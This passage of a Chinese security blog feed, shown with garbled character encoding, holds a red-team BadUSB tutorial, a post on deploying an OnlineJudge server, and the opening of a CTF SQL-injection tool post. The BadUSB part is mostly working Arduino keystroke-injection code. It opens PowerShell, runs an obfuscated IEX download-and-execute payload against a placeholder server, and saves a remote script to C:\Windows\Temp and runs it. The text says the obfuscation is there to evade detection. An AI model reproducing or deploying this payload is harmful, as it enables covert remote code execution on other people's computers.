&#x27;a&#x27; é”®ï¼Œä»¥ä¸ŠæŒ‰é”®åŒç†</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">end</span>();<span class="comment">// ç»“æŸé”®ç›˜æ¨¡æ‹Ÿ</span></span><br></pre></td></tr></table></figure></li><li><p>ç¼–å†™ä¸€ä¸ªå¼¹å‡ºæµè§ˆå™¨æ‰“å¼€ç™¾åº¦ï¼ˆä»…é™keyboard.hæ¡†æ¶ä¸‹ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;Keyboard.h&gt;</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">setup</span>()&#123;</span><br><span class="line">Keyboard.<span class="title function_ invoke__">begin</span>(); <span class="comment">// åˆå§‹åŒ–é”®ç›˜åº“</span></span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">3000</span>); <span class="comment">// ç­‰å¾… 3 ç§’é’Ÿï¼ˆ3000æ¯«ç§’ï¼‰</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_GUI); <span class="comment">// æŒ‰ä¸‹å·¦ Windows é”®</span></span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">200</span>); <span class="comment">// ç­‰å¾… 0.2 ç§’é’Ÿï¼ˆ200æ¯«ç§’ï¼‰</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27;r&#x27;</span>); <span class="comment">// æŒ‰ä¸‹ &#x27;r&#x27; é”®</span></span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">200</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_CAPS_LOCK);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">200</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;&lt;HTTP://baidu.COM&gt;&quot;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">Keyboard.<span class="title function_ invoke__">end</span>();<span class="comment">// ç»“æŸé”®ç›˜æ¨¡æ‹Ÿ</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">loop</span>() &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ç¼–å†™å¥½ä»£ç åï¼Œå°±å¯ä»¥å¼€å§‹éªŒè¯ï¼Œæœ‰è¾“å‡ºï¼Œæ— æŠ¥é”™ï¼Œå°±å¯ä»¥ä¸Šä¼ åˆ°badusbäº†ã€‚ä¸Šä¼ æˆåŠŸåï¼Œä¼šä¼˜å…ˆæ‰§è¡Œä¸€æ¬¡ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ³¨æ„ï¼š</span><br><span class="line">è¦æ˜¯å†™å…¥äº†æ”»å‡»ä»£ç ï¼ˆä¸å«loopæ–¹æ³•ï¼‰ï¼Œå¦‚ä½•ä¸è¢«æ‰§è¡Œæ”»å‡»ä»£ç ï¼Ÿ</span><br><span class="line">åªéœ€è¦æ‰“å¼€è®°äº‹æœ¬ï¼Œæ’å…¥badusbï¼Œç„¶åé¼ æ ‡ä¸åœç‚¹å‡»è®°äº‹æœ¬ï¼Œä»£ç å°±éƒ½å†™åœ¨è®°äº‹æœ¬ä¸Šäº†ã€‚</span><br></pre></td></tr></table></figure></li></ol><h2 id="ä¸‰ã€å¼€ç¼–åå¼¹shell"><a href="#ä¸‰ã€å¼€ç¼–åå¼¹shell" class="headerlink" title="ä¸‰ã€å¼€ç¼–åå¼¹shell"></a>ä¸‰ã€å¼€ç¼–åå¼¹shell</h2><ol><li><p>é€‰ç”¨åå¼¹å·¥å…·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ç›´æ¥ç”¨cmdã€ncï¼Œéƒ½ä¼šè¢«ç«ç»’æ‹¦æˆª</span><br><span class="line">ç”¨powershell æ˜¯æ¯”è¾ƒåˆé€‚çš„ã€‚</span><br><span class="line">payloadï¼š</span><br><span class="line">cmd /c <span class="keyword">echo</span> set-alias -name xz -value IEX;<span class="title function_ invoke__">xs</span> (New-Object \\<span class="string">&quot;NeT.WeBClient\\&quot;</span>).<span class="title function_ invoke__">downloadstring</span>(<span class="string">&#x27;&lt;http://xxxxx/xxx.ps1&gt;&#x27;</span>) | powershell</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸‹è½½å¹¶æ‰§è¡Œxxx.ps1è„šæœ¬ï¼Œè¿™ä¸ªpayload æ˜¯æœ‰åšæ··æ·†çš„ï¼Œæ¯•ç«Ÿç›´æ¥è¿è¡Œpowershell å¹¶åŠ ä¸Šæ”»å‡»ä»£ç ï¼Œå¯èƒ½ä¼šè¢«æ£€æµ‹ã€‚</span></span><br></pre></td></tr></table></figure></li><li><p>åå¼¹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">setup</span>() &#123;</span><br><span class="line">Keyboard.<span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">5000</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_GUI);</span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">500</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_CAPS_LOCK);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">500</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">500</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;cmd /c echo set-alias -name xz -value IEX;xs (New-Object \\&quot;</span>NeT.WeBClient\\<span class="string">&quot;).downloadstring(&#x27;&lt;http://xxxxx/xxx.ps1&gt;&#x27;) | powershell&quot;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_CAPS_LOCK);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(KEY_CAPS_LOCK);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">5000</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_ALT);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">releaseAll</span>();</span><br><span class="line">Keyboard.<span class="title function_ invoke__">end</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">loop</span>() &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/Red-Team-Invasion-BadUSB/Untitled4.png" alt="Untitled"></p></li></ol><h2 id="å››ã€é‡Šæ”¾ç¼–è¯‘ä»£ç "><a href="#å››ã€é‡Šæ”¾ç¼–è¯‘ä»£ç " class="headerlink" title="å››ã€é‡Šæ”¾ç¼–è¯‘ä»£ç "></a>å››ã€é‡Šæ”¾ç¼–è¯‘ä»£ç </h2><p>å¦‚æœå·²ç»å†™å…¥äº†æ”»å‡»ä»£ç ï¼Œä½†æ˜¯ä¸æƒ³å»æ‰§è¡Œçš„è¯ï¼Œå¯ä»¥åœ¨æ’å…¥Uç›˜ä¹‹å‰ï¼Œå…ˆæ‰“å¼€è®°äº‹æœ¬ï¼Œæ’å…¥Uç›˜ä¹‹åï¼Œä¸åœç‚¹å‡»åœ¨è®°äº‹æœ¬ä¸Šã€‚</p><h2 id="äº”ã€å¿«é€Ÿå–æ¶ˆcmdå¼¹æ¡†"><a href="#äº”ã€å¿«é€Ÿå–æ¶ˆcmdå¼¹æ¡†" class="headerlink" title="äº”ã€å¿«é€Ÿå–æ¶ˆcmdå¼¹æ¡†"></a>äº”ã€å¿«é€Ÿå–æ¶ˆcmdå¼¹æ¡†</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">5000</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_ALT);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">releaseAll</span>();</span><br><span class="line">Keyboard.<span class="title function_ invoke__">end</span>();<span class="comment">// ç»“æŸé”®ç›˜æ¨¡æ‹Ÿ</span></span><br></pre></td></tr></table></figure><h2 id="å…­ã€è‡ªç¼–è¯‘"><a href="#å…­ã€è‡ªç¼–è¯‘" class="headerlink" title="å…­ã€è‡ªç¼–è¯‘"></a>å…­ã€è‡ªç¼–è¯‘</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;Keyboard.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">setup</span>() &#123;</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">begin</span>();</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">5000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_GUI);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">releaseAll</span>();</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">press</span>(KEY_CAPS_LOCK);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">release</span>(KEY_CAPS_LOCK);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;powershell&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;<span class="subst">$url</span>=\\&#x27;&lt;http://&lt;vps_ip&gt;:&lt;port&gt;/xxx.ps1\\&gt;&#x27;&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;<span class="subst">$output</span>=\\&#x27;c:\\\\windows\\\\temp\\\\xxx.ps1\\&#x27;&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">press</span>(KEY_CAPS_LOCK);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">release</span>(KEY_CAPS_LOCK);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;<span class="subst">$client</span>=new-object System.Net.WebClient&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;<span class="subst">$client</span>.DownloadFile(<span class="subst">$URL</span>,<span class="subst">$OUTPUT</span>)&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">5000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;C:\\\\Windows\\\\Temp\\\\XXX.PS1&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">10000</span>);</span><br><span class="line">  <span class="comment">//Keyboard.press(KEY_LEFT_ALT);</span></span><br><span class="line">  <span class="comment">//Keyboard.press(&#x27; &#x27;);</span></span><br><span class="line">  <span class="comment">//Keyboard.press(&#x27;c&#x27;);</span></span><br><span class="line">  <span class="comment">//Keyboard.releaseAll();</span></span><br><span class="line">  Keyboard.<span class="title function_ invoke__">end</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">loop</span>() &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çº¢é˜Ÿå…¥ä¾µ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çº¢é˜Ÿè¿‘æºBadUSB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å…¶ä»–ç»éªŒã€‘OJç³»ç»Ÿâ€”OnlineJudgeDeployæ­å»º</title>
      <link href="/2024/04/11/Extracurricular-experience-OJ-System-build/"/>
      <url>/2024/04/11/Extracurricular-experience-OJ-System-build/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€å…¶ä»–ç»éªŒã€‘OJç³»ç»Ÿâ€”OnlineJudgeDeployæ­å»º"><a href="#ã€å…¶ä»–ç»éªŒã€‘OJç³»ç»Ÿâ€”OnlineJudgeDeployæ­å»º" class="headerlink" title="ã€å…¶ä»–ç»éªŒã€‘OJç³»ç»Ÿâ€”OnlineJudgeDeployæ­å»º"></a>ã€å…¶ä»–ç»éªŒã€‘OJç³»ç»Ÿâ€”OnlineJudgeDeployæ­å»º</h1><h2 id="ä¸€ã€ç¯å¢ƒå‡†å¤‡"><a href="#ä¸€ã€ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ä¸€ã€ç¯å¢ƒå‡†å¤‡"></a>ä¸€ã€ç¯å¢ƒå‡†å¤‡</h2><h3 id="1ã€äº‘æœåŠ¡å™¨"><a href="#1ã€äº‘æœåŠ¡å™¨" class="headerlink" title="1ã€äº‘æœåŠ¡å™¨"></a>1ã€äº‘æœåŠ¡å™¨</h3><p>æ—¢ç„¶æ­å»ºOJï¼Œè‚¯å®šä¸èƒ½åªåœ¨æœ¬åœ°è®¿é—®ï¼Œè€Œæ˜¯è®©å¤§å®¶éƒ½å¯ä»¥è®¿é—®çš„åˆ°ï¼Œé‚£ä¹ˆäº‘æœåŠ¡å™¨æ˜¯å¿…ä¸å¯å°‘çš„ã€‚</p><p>åœ¨å›½å†…ï¼Œåƒé˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€åä¸ºäº‘ç­‰ï¼Œéœ€è¦è´­ä¹°ä¸€å°æœåŠ¡å™¨ï¼Œå¦‚æœè®¿é—®é‡å°‘çš„è¯ï¼Œä¸€å°2æ ¸(vCPU) 2GiB çš„é…ç½®å°±å¤Ÿäº†ã€‚</p><p>æ¨èçš„æ“ä½œç³»ç»Ÿæ˜¯Dibanã€Centosã€Ubuntu ç­‰Linux æ“ä½œç³»ç»Ÿã€‚Windowså¯ä»¥ä½¿ç”¨Windows Serveræœºå™¨ï¼Œä½†æ˜¯ç›¸è¾ƒäºLinuxæ“ä½œæ¥è¯´ï¼Œwindowsæœºå™¨é…ç½®ç›¸è¾ƒéº»çƒ¦ã€‚</p><p>ä¸‹é¢ä»¥Debianæ“ä½œç³»ç»Ÿä¸ºä¾‹ã€‚</p><h3 id="2ã€Docker"><a href="#2ã€Docker" class="headerlink" title="2ã€Docker"></a>2ã€Docker</h3><p>å®‰è£…docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get update </span><br><span class="line">apt-get install docker.io</span><br><span class="line"></span><br><span class="line">//æŸ¥çœ‹æ˜¯å¦å®‰è£…</span><br><span class="line">docker --version</span><br></pre></td></tr></table></figure><h3 id="3ã€Docker-compose"><a href="#3ã€Docker-compose" class="headerlink" title="3ã€Docker-compose"></a>3ã€Docker-compose</h3><p>å¯ä»¥ä»å®˜ç½‘æˆ–è€…GitHubä¸Šä¸‹è½½</p><p>ä¹Ÿå¯ç›´æ¥ä»ç™¾åº¦ç½‘ç›˜ä¸‹è½½ï¼š<img src="/img/Extracurricular-experience-OJ-System-build/image-20240413161404491.png" alt="image-20240413161404491"></p><p>ä¸‹è½½å¥½ä¹‹åä¸Šä¼ åˆ°äº‘æœåŠ¡å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1ã€å°†ä¸‹è½½çš„composeä¸Šä¼ åˆ°æœåŠ¡å™¨ä¹‹åï¼š</span><br><span class="line">mv docker-compose-linux-x86_64 /usr/local/bin/docker-compose</span><br><span class="line">2ã€æ·»åŠ æ‰§è¡Œæƒé™ï¼š</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line">3ã€æ£€æŸ¥ç‰ˆæœ¬ï¼š</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><h2 id="äºŒã€OJç³»ç»Ÿæ­å»º"><a href="#äºŒã€OJç³»ç»Ÿæ­å»º" class="headerlink" title="äºŒã€OJç³»ç»Ÿæ­å»º"></a>äºŒã€OJç³»ç»Ÿæ­å»º</h2><p>1ã€æ‰¾ä¸€ä¸ªç©ºç™½æ–‡ä»¶å¤¹ï¼Œä¸‹è½½éœ€è¦çš„èµ„æº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b 2.0 https://github.com/QingdaoU/OnlineJudgeDeploy.git</span><br></pre></td></tr></table></figure><p>2ã€è¿›å…¥ç›®å½•ï¼Œæ‰§è¡Œå®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd OnlineJudgeDeploy </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>å®‰è£…å¥½åï¼Œæµè§ˆå™¨æ‰“å¼€æœåŠ¡å™¨IPåœ°å€å³å¯ã€‚</p><p>åå°åœ¨ &#x2F;admin ä¸‹ï¼Œé»˜è®¤åå°è´¦å·å¯†ç ï¼šroot&#x2F;rootrootã€‚</p><p>ç™»é™†åå°è¯·åŠæ—¶ä¿®æ”¹å¯†ç </p><h2 id="ä¸‰ã€é¢˜åº“ä¸‹è½½"><a href="#ä¸‰ã€é¢˜åº“ä¸‹è½½" class="headerlink" title="ä¸‰ã€é¢˜åº“ä¸‹è½½"></a>ä¸‰ã€é¢˜åº“ä¸‹è½½</h2><p>é¢˜åº“ä¸‹è½½åœ°å€ï¼š<a href="http://tk.hustoj.com/problemset.php?search=free">http://tk.hustoj.com/problemset.php?search=free</a></p>]]></content>
      
      
      <categories>
          
          <category> å…¶ä»–ç»éªŒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OJç³»ç»Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Pythonæ­¦å™¨åº“ã€‘SQLæ³¨å…¥è„šæœ¬â€”å¸ƒå°”æ³¨å…¥ï¼ˆç¬¬ä¸€ç¯‡ï¼‰</title>
      <link href="/2024/04/08/Python-tools-SQLBoole/"/>
      <url>/2024/04/08/Python-tools-SQLBoole/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Pythonæ­¦å™¨åº“ã€‘SQLæ³¨å…¥è„šæœ¬â€”å¸ƒå°”æ³¨å…¥ï¼ˆç¬¬ä¸€ç¯‡ï¼‰"><a href="#ã€Pythonæ­¦å™¨åº“ã€‘SQLæ³¨å…¥è„šæœ¬â€”å¸ƒå°”æ³¨å…¥ï¼ˆç¬¬ä¸€ç¯‡ï¼‰" class="headerlink" title="ã€Pythonæ­¦å™¨åº“ã€‘SQLæ³¨å…¥è„šæœ¬â€”å¸ƒå°”æ³¨å…¥ï¼ˆç¬¬ä¸€ç¯‡ï¼‰"></a>ã€Pythonæ­¦å™¨åº“ã€‘SQLæ³¨å…¥è„šæœ¬â€”å¸ƒå°”æ³¨å…¥ï¼ˆç¬¬ä¸€ç¯‡ï¼‰</h1><h1 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h1><p>åœ¨åšCTF çš„è¿‡ç¨‹ä¸­ï¼Œå‡ºé¢˜äººé™åˆ¶SQLMap çš„ä½¿ç”¨ï¼Œä½†æ˜¯æ‰‹å·¥æ³¨å…¥åˆè¿‡äºéº»çƒ¦å’Œè€—æ—¶ï¼Œäºæ˜¯æƒ³è‡ªå·±æ‰‹æŠŠæ‰‹å†™ä¸€ä¸ªè‡ªå·±çš„SQLæ³¨å…¥è„šæœ¬å·¥å…·ï¼Œä¸å¿…åƒSQLMap é‚£æ ·å…·å¤‡å¼ºå¤§çš„åŠŸèƒ½ï¼Œä»…ä»…åœ¨CTF æˆ–å…¶ä»–SQLæ³¨å…¥åœºæ™¯å¤Ÿç”¨å³å¯ã€‚</p><p>å¸¸åšCTF çš„åŒå­¦éƒ½çŸ¥é“ï¼ŒCTF çš„SQLæ³¨å…¥åœºæ™¯æœ€å¤šçš„æ˜¯å¸ƒå°”æ³¨å…¥ï¼Œé‚£ä¹ˆè¿™é‡Œå…ˆåˆ¶ä½œå¸ƒå°”æ³¨å…¥çš„è„šæœ¬å·¥å…·ã€‚</p><h1 id="äºŒã€å·¥å…·ä½¿ç”¨ç¤ºä¾‹"><a href="#äºŒã€å·¥å…·ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="äºŒã€å·¥å…·ä½¿ç”¨ç¤ºä¾‹"></a>äºŒã€å·¥å…·ä½¿ç”¨ç¤ºä¾‹</h1><h2 id="1ã€æœ¬åœ°æµ‹è¯•"><a href="#1ã€æœ¬åœ°æµ‹è¯•" class="headerlink" title="1ã€æœ¬åœ°æµ‹è¯•"></a>1ã€æœ¬åœ°æµ‹è¯•</h2><p><img src="/img/Python-tools-SQLBoole/image-20240408173516618.png" alt="image-20240408173516618"></p><p><img src="/img/Python-tools-SQLBoole/image-20240408173707655.png" alt="image-20240408173707655"></p><h2 id="2ã€CTFå®æˆ˜ç¤ºä¾‹"><a href="#2ã€CTFå®æˆ˜ç¤ºä¾‹" class="headerlink" title="2ã€CTFå®æˆ˜ç¤ºä¾‹"></a>2ã€CTFå®æˆ˜ç¤ºä¾‹</h2><p><img src="/img/Python-tools-SQLBoole/image-20240408175520812.png" alt="image-20240408175520812"></p><p><img src="/img/Python-tools-SQLBoole/image-20240408175616830.png" alt="image-20240408175616830"></p><h1 id="ä¸‰ã€è„šæœ¬æ‹†åˆ†"><a href="#ä¸‰ã€è„šæœ¬æ‹†åˆ†" class="headerlink" title="ä¸‰ã€è„šæœ¬æ‹†åˆ†"></a>ä¸‰ã€è„šæœ¬æ‹†åˆ†</h1><h2 id="1ã€å…ˆçœ‹ä¸»çº¿ç¨‹"><a href="#1ã€å…ˆçœ‹ä¸»çº¿ç¨‹" class="headerlink" title="1ã€å…ˆçœ‹ä¸»çº¿ç¨‹"></a>1ã€å…ˆçœ‹ä¸»çº¿ç¨‹</h2><p>ä¸ºäº†è®©è¾“å‡ºæœ‰é‡ç‚¹åŒºåˆ†ï¼Œé‡‡ç”¨äº†é¢œè‰²è¾“å‡ºï¼Œæ‰€ä»¥main()æ–¹æ³•çœ‹èµ·æ¥éå¸¸çš„æ··ä¹±ï¼Œä½†æ˜¯è¿è¡Œèµ·æ¥éå¸¸çš„é†’ç›®ã€‚</p><p>åœ¨main()æ–¹æ³•ä¸­å¯ç”¨äº†ä¸€ä¸ªå‰¯çº¿ç¨‹ï¼Œæ˜¯ä¸ºäº†ç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ç»™ç”¨æˆ·ä¸€ä¸ªæ­£åœ¨æ‰§è¡Œä¸­çš„ä¸€ä¸ªè¿›åº¦æ¡åŠ è½½çš„æç¤ºã€‚</p><p>åŒæ—¶ä½¿ç”¨while æ­»å¾ªç¯ï¼Œæ–¹ä¾¿ç”¨æˆ·ä¾¿åˆ©æŸ¥è¯¢æ•°æ®åº“ä¸­æ‰€æœ‰çš„è¡¨å’Œå­—æ®µä»¥åŠæ•°å€¼ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 